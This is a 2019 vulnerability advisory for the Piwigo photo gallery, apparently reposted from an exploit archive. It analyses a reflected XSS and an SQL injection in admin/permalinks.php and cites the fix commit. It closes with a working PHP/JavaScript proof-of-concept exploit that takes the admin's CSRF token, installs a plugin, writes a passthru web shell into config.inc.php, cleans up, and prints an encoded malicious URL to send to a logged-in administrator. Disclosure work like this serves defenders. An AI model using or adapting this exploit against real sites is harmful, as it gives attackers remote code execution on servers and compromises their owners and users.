@@ -1,0 +1,270 @@
+id: 33274
+date: 09/23/2019
+title: Piwigo 2.9.5 Cross Site Scripting / SQL Injection / Command Execution Vulnerabilities
+author: James Bercegay
+cves: 
+
+###########################################################################
+#                 Piwigo <= 2.9.5 Multiple Vulnerabilities                #            
+###########################################################################
+ 
+
+Released Date: 2019-09-22
+Last Modified: 2019-09-22
+ Company Info: Piwigo.org
+ Version Info: 
+              Vulnerable
+               Piwigo <= 2.9.5
+ 
+
+--[ Table of contents
+
+00 - Introduction
+    00.1 Background
+
+01 - Cross Site Scripting
+    01.1 - Vulnerable code analysis
+    01.2 - Remote exploitation
+
+02 - SQL Injection
+    02.1 - Vulnerable code analysis
+    02.2 - Remote exploitation
+
+03 - Credit
+
+04 - Solution
+
+05 - Contact information
+
+
+--[ 00 - Introduction
+
+The purpose of this article is to detail the vulnerabilities that I found 
+in the Piwigo software. 
+
+
+--[ 00.1 - Background
+
+Piwigo is a popular open source photo gallery application written in PHP.
+
+
+--[ 01 - Cross Site Scripting
+
+Piwigo is vulnerable to a XSS issue within the "permalinks" functionality. 
+This vulnerability can be exploited by an attacker to execute arbitrary 
+client side code within the context of the victim client.
+
+--[ 01.1 - Vulnerable code analysis
+
+The vulnerable code can be found within the "parse_sort_variables" function
+which is located in admin/permalinks.php and is as follows:
+
+$url_components = parse_url( $_SERVER['REQUEST_URI'] );
+
+$base_url = $url_components['path'];
+
+parse_str($url_components['query'], $vars);
+$is_first = true;
+foreach ($vars as $key => $value)
+{
+  if (!in_array($key, $get_rejects) and $key!=$get_param)
+  {
+    $base_url .= $is_first ? '?' : '&';
+    $is_first = false;
+    $base_url .= $key.'='.urlencode($value);
+  }
+}
+
+As we can see from the above code, the user supplied "REQUEST_URI" server
+variable is used to build the $base_url variable which is later displayed
+as a link to the end user. The problem with this code is that value data is
+urlencoded, but key data is unasanitized. This leads to a reflected XSS
+condition which could allow an attacker to force an authenticated admin
+user to perform malicious actions silently on the attackers behalf.
+
+--[ 01.2 - Remote exploitation
+
+The Javascript payload that I created was able to create a web shell on the 
+remote host by taking the following steps once executed by an authenticated 
+administrator.
+
+1] Gather "pwg_token" CSRF token
+2] Install LocalFilesEditor plugin
+3] Activate plugin
+4] Write shell to /local/config/config.inc.php
+5] De activate plugin
+6] Uninstall plugin
+7] Redirect user to the index page
+
+Exploitation of this issue is rather straight forward, but because 
+variables in PHP can't have dots and spaces in their names so those are 
+converted to underscores by the call to "parse_str" in the vulnerable code
+shown earlier. An attacker must adhere to these limitations whenever
+constructing XSS payloads. 
+
+
+--[ 02 - SQL Injection
+
+Piwigo is vulnerable to an SQL Injection issue within the "permalinks" 
+functionality. This vulnerability can be exploited by an attacker to execute 
+arbitrary SQL statements.
+
+--[ 02.1 - Vulnerable code analysis
+
+The vulnerable code can be found located in the admin/permalinks.php file and is 
+as follows:
+
+if ( isset($_POST['set_permalink']) and $_POST['cat_id']>0 )
+{
+  check_pwg_token();
+  $permalink = $_POST['permalink'];
+  if ( empty($permalink) )
+    delete_cat_permalink($_POST['cat_id'], isset($_POST['save']) );
+  else
+    set_cat_permalink($_POST['cat_id'], $permalink, isset($_POST['save']) );
+  $selected_cat = array( $_POST['cat_id'] );
+}
+
+Both the "set_cat_permalink" and "delete_cat_permalink" functions rely on the 
+"cat_id" variable already being sanitized. However, the only sanity checks that
+take place with "cat_id" are to make sure it is greater than zero. This is not
+sufficient as PHP type juggling will cast a string that starts with a number to 
+a valid integer for the comparison, yet the original tainted value will remain.
+This allows an attacker to pass a string that starts with an integer in order to
+achieve SQL Injection.
+
+--[ 02.2 - Remote exploitation
+
+It seems an admin account is required to exploit this issue, so I did not bother
+with trying to write an exploit for this issue.
+
+--[ 03 - Credit
+
+James Bercegay
+GulfTech Research and Development
+
+
+--[ 04 - Solution
+
+The issue is addressed with the following commit.
+
+https://github.com/Piwigo/Piwigo/commit/7e154ab093546e5288221685c1f8bfec2382d09a
+
+This is scheduled for release 2.10.0.RC2
+
+
+--[ 05 - Contact information
+
+Web
+https://gulftech.org/
+
+Mail
+security@gulftech.org
+
+
+Copyright 2019 GulfTech Research and Development. All rights reserved.
+
+
+---------------------------------------------------------------
+2019_piwigo_permalinks_xss_to_rce.php Proof of Concept exploit:
+
+<?php
+////////////////////////////////////////////////////////////////////////////////
+// Piwigo <= 2.9.5 XSS to RCE Proof of Concept 
+// James Bercegay ( http://www.gulftech.org/ )
+////////////////////////////////////////////////////////////////////////////////
+
+// Start output buffering for JavaScript content
+ob_start();
+?>
+// BEGIN JAVASCRIPT
+
+// CSRF protection token
+var pwg = document.forms[0].pwg_token.value;
+
+// Webshell PHP code
+var php = "passthru(urldecode($_REQUEST['x']));";
+
+// LocalFilesEditor version info
+var rev = "6861";
+var ext = "144";
+
+// Build URL
+var url = "admin.php?page=plugins&tab=new&revision=" +
+       rev +
+      "&extension=" +
+      ext +
+      "&pwg_token=" + pwg;
+
+// Install plugin
+$.ajax({
+    async: false,
+    type: "GET",
+    url: url
+});
+
+// Build URL
+var url = "admin.php?page=plugins&plugin=LocalFilesEditor&pwg_token=" + 
+       pwg + 
+      "&action=activate";
+
+// Activate plugin
+$.ajax({
+    async: false,
+    type: "GET",
+    url: url,
+    success: function (response) {
+
+      // Build URL
+    var url = "admin.php?page=plugin-LocalFilesEditor-localconf";
+
+    // Keep space at the beginning of php payload. It's intentional.
+    $.post( url, { pwg_token: pwg, text: " " + php, submit: "1" } );
+
+}});
+
+// Build URL
+var url = "admin.php?page=plugins&plugin=LocalFilesEditor&pwg_token=" + 
+       pwg + 
+      "&action=deactivate";
+
+// De Activate plugin
+$.ajax({
+    async: false,
+    type: "GET",
+    url: url
+});
+
+// Build URL
+var url = "admin.php?page=plugins&plugin=LocalFilesEditor&pwg_token=" +
+       pwg + 
+      "&action=delete";
+
+// Uninstall plugin 
+$.ajax({
+    async: false,
+    type: "GET",
+    url: url
+});
+
+// Redirect user
+document.location = "admin.php";
+
+// ENDED JAVASCRIPT
+<?php
+
+// Encode contents using base64 encoding. We do this because PHP strips certain 
+// characters from key values, and will prevent loading javascript containing a 
+// dot for example.
+$b64 = base64_encode(ob_get_clean());
+
+// Formatted URL
+$url = '/admin.php?page=permalinks&"><script>eval(atob("%s"));</script><a+"=1';
+
+// Output
+printf($url, urlencode($b64));
+printf("\nSend the above URL to a logged in administrator.");
+printf("\nShell will be located at: local/config/config.inc.php");
+?>
+
+#  0day.today [2023-03-27]  #
